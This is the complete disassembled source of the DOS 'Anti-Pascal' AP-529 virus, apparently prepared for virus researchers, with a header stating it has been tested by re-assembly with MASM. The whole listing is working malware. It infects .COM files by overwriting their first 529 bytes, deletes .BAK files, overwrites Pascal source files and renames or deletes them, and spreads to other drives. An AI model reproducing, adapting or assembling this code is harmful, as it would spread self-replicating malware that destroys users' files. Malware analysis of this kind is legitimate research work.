	page	,132
	name	AP529
	title	AP529 - The 'Anti-Pascal' Virus, version AP-529
	.radix	16

; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 บ
; บ  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255	     บ
; บ									     บ
; บ		      The 'Anti-Pascal' Virus, version AP-529                บ
; บ		   Disassembled by Vesselin Bontchev, June 1990 	     บ
; บ									     บ
; บ		    Copyright (c) Vesselin Bontchev 1989, 1990		     บ
; บ									     บ
; บ	 This listing is only to be made available to virus researchers      บ
; บ		   or software writers on a need-to-know basis. 	     บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

; The disassembly has been tested by re-assembly using MASM 5.0.

code	segment
	assume	cs:code,ds:code

	org	100

vlen	=	v_end-start
crit	equ	12		; Address of the original INT 24h handler

start:
	push	ax		; Save registers used
	push	cx
	push	si
	push	di
	push	bx
	push	flen		; Save current file length

; The operand of the instruction above is used as a signature by the virus

sign	equ	$-2

	jmp	short v_start	; Go to virus start

flen	dw	vlen		; File length before infection
f_name	db	13d dup (?)	; File name buffer for the rename function call
fmask	db	'*.'            ; Mask for FindFirst/FindNext
fext	db	'com', 0        ; The extension part of the file mask
parent	db	'..', 0         ; Path for changing to the parent dir

com	db	'com'           ; File extensions used
bak	db	'bak'
pas	db	'pas'
wild	db	'???'
exe	db	'exe'

dta	equ	$		; Disk Transfer Address area
drive	db	?		;Drive to search for
pattern db	11d dup (?)	;Search pattern
reserve db	9 dup (?)	;Not used
attrib	db	?		;File attribute
time	dw	?		;File time
date	dw	?		;File date
fsize	dd	?		;File size
namez	db	14d dup (?)	;File name found

mem_seg dw	?		; Segment of the allocated I/O buffer
sizehld dw	?		; Size holder

v_start:
	mov	bx,1000 	; Shrink program memory size to 64 K
	mov	ah,4A
	int	21		; Do it

	mov	ah,48		; Allocate I/O buffer in memory
	mov	bx,vlen/16d+1	;  (at least vlen long)
	int	21		; Do it
	jc	cleanup 	; Exit on error
	mov	mem_seg,ax	; Save the segment of the allocated memory

	mov	ax,2524 	; Set critical error handler
	mov	dx,offset int_24
	int	21		; Do it

	mov	ah,1A		; Set new DTA area
	mov	dx,offset dta
	int	21		; Do it

	mov	ah,19		; Get default drive
	int	21
	push	ax		; Save it on stack

	call	infect		; Proceed with infection

	int	11		; Put equipment bits in ax
	test	ax,1		; Diskette drives present?
	jz	cleanup 	; Exit if not (?!)

	shl	ax,1		; Get number of floppy disk drives
	shl	ax,1		;  in AH (0-3 means 1-4 drives)
	and	ah,3

	add	ah,2		; Convert the number of drives to
	mov	al,ah		;  the range 2-5 and put it into BL
	mov	bx,ax
	xor	bh,bh

	cmp	bl,3		; More than 2 floppy drives?
	ja	many		; Check if the highest one is removable if so
	mov	bl,3		; Otherwise check disk C:
many:
	mov	ax,4408 	; Check whether device is removable
	int	21
	jc	cleanup 	; Exit on error (network)
	or	ax,ax		; Is device removable?
	jz	cleanup 	; Exit if so

	mov	dl,bl		; Otherwise select it as default
	dec	dl
	mov	ah,0E
	int	21		; Do it

	call	infect		; Proceed with this drive also

cleanup:
	pop	dx		; Restore saved default disk from stack
	mov	ah,0E		; Set default drive
	int	21		; Do it

	pop	flen		; Restore flen

	mov	es,mem_seg	; Free allocated memory
	mov	ah,49
	int	21		; Do it

	mov	ah,4A		; Get all the available memory
	push	ds		; ES := DS
	pop	es
	mov	bx,-1
	int	21		; Do it

	mov	ah,4A		; Assign it to the program (the initial state)
	int	21		; Do it

	mov	dx,80		; Restore old DTA
	mov	ah,1A
	int	21		; Do it

	mov	ax,2524 	; Restore old critical error handler
	push	ds		; Save DS
	lds	dx,dword ptr ds:[crit]
	int	21		; Do it
	pop	ds		; Restore DS

	pop	bx		; Restore BX

	mov	ax,4F		; Copy the program at exit_pgm into
	mov	es,ax		;  the Intra-Aplication Communication
	xor	di,di		;  Area (0000:04F0h)
	mov	si,offset exit_pgm
	mov	cx,pgm_end-exit_pgm	; exit_pgm length
	cld
	rep	movsb		; Do it
	mov	ax,ds		; Correct the Far JMP instruction with
	stosw			;  the current DS value

	mov	di,offset start ; Prepare for moving vlen bytes
	mov	si,flen 	;  from file end to start
	add	si,di
	mov	cx,vlen
	push	ds		; ES := DS
	pop	es
;	jmp	far ptr 004F:0000	; Go to exit_pgm
	db	0EA, 0, 0, 4F, 0

exit_pgm:
	rep	movsb		; Restore the original bytes of the file
	pop	di		; Restore registers used
	pop	si
	pop	cx
	pop	ax
	db	0EA, 0, 1	; JMP Far at XXXX:0100
pgm_end equ	$

lseek:
	mov	ah,42
	xor	cx,cx		; Offset := 0
	xor	dx,dx
	int	21		; Do it
	ret			; And exit

f_first:			; Find first file with extension pointed by SI
	mov	di,offset fext	; Point DI at extension part of fmask
	cld			; Clear direction flag
	movsw			; Copy the extension pointed by SI
	movsb			;  to file mask for FindFirst/FindNext
	mov	ah,4E		; Find first file matching fmask
	mov	cx,20		; Normal files only
	mov	dx,offset fmask
	ret			; Exit

wr_body:
	mov	ax,3D02 	; Open file for reading and writing
	mov	dx,offset namez ; FIle name is in namez
	int	21		; Do it
	mov	bx,ax		; Save handle in BX

	mov	ah,3F		; Read the first vlen bytes of the file
	mov	cx,vlen 	;  in the allocated memory buffer
	push	ds		; Save DS
	mov	ds,mem_seg
	xor	dx,dx
	int	21		; Do it

	mov	ax,ds:[sign-start]	; Get virus signature
	pop	ds		; Restore DS
	cmp	ax,word ptr ds:[offset sign]	; File already infected?
	je	is_inf		; Exit if so
	push	ax		; Save AX
	mov	al,0		; Lseek to the file beginning
	call	lseek		; Do it
	mov	ah,40		; Write virus body over the
	mov	dx,offset start ;  first bytes of the file
	mov	cx,sizehld	; Number of bytes to write
	int	21		; Do it

	pop	ax		; Restore AX
	clc			; CF == 0 means infection successfully done
	ret			; Exit
is_inf:
	stc			; CF == 1 means file already infected
	ret			; Exit

rename:
	push	si		; Save SI
	mov	si,offset namez ; Point SI at file name
	mov	dx,si		; Point DX there too
	mov	di,offset f_name	; Point DI at the name buffer

cpy_name:
	lodsb			; Get byte from the file name
	stosb			; Store it in the name buffer
	cmp	al,'.'          ; Is all the name (up to the extension) copied?
	jne	cpy_name	; Loop if not

	pop	si		; Restore SI
	movsw			; Copy the new extension
	movsb			;  into the file name buffer
	xor	al,al		; Make the file name ASCIIZ
	stosb			;  by placing a zero after it

	mov	ah,56		; Now rename the file to the new extension
	mov	di,offset f_name
	int	21		; Do it
	ret			; Done. Exit

infect:
	mov	si,offset com	; Find the first .COM file in this dir
	call	f_first
f_next2:
	int	21		; Do it
	jc	pass_2		; Do damage if no such files

	mov	ax,word ptr fsize	; Check the size of the file found
	cmp	ax,vlen 	; Less than virus length?
	jb	next		; Too small, don't touch
	cmp	ax,0FFFF-vlen	; Bigger than 64 K - vlen?
	ja	next		; Too big, don't touch
	mov	flen,ax 	; Save file length
	mov	sizehld,vlen
	call	wr_body 	; Write virus body over the file
	jc	next		; Exit on error
	mov	al,2		; Lseek to file end
	call	lseek		; Do it
	push	ds		; Save DS
	mov	ds,mem_seg	; Write the original bytes from
	mov	cx,vlen 	;  the file beginning after its end
	xor	dx,dx
	mov	ah,40
	int	21		; Do it
	pop	ds		; Restore DS

close:
	mov	ah,3E		; Close the file handle
	int	21		; Do it
	ret			; And exit

next:
	call	close		; Close the file
	mov	ah,4F		; And go find another one
	jmp	f_next2

pass_2:
	mov	si,offset bak	; Find a *.BAK file
	call	f_first 	; Do it
	int	21
	jc	pas_srch	; On error search for *.PAS files
	mov	dx,offset namez ; Otherwise delete the file
	mov	ah,41		; Do it
	int	21

pas_srch:
	mov	si,offset pas	; Find a *.PAS file
	call	f_first 	; Do it
	int	21
	jc	inf_xit 	; Exit on error

	mov	ax,word ptr fsize
	mov	sizehld,ax	; Save file size
	call	wr_body 	; Overwrite the file with the virus body
	call	close		; Close it
	mov	si,offset com	; Try to rename it as a .COM file
	call	rename		; Do it
	jnc	inf_xit 	; Exit if renaming OK
	mov	si,offset exe	; Otherwise try to rename it as an .EXE file
	call	rename		; Do it
	jnc	inf_xit 	; Exit if renaming OK
	mov	ah,41		; Otherwise just delete that stupid file
	int	21		; Do it
inf_xit:
	ret			; And exit

int_24: 			; Critical error handler
	mov	al,2		; Abort suggested (?!)
	iret			; Return

v_end	=	$

; Here goes the rest of the original program (if any):

; And here (after the  end of file) are the overwritten first 529 bytes:

	jmp	quit		; The original "program"

	db	(529d - 8) dup (90)

quit:
	mov	ax,4C00 	; Just exit
	int	21

code	ends
	end	start
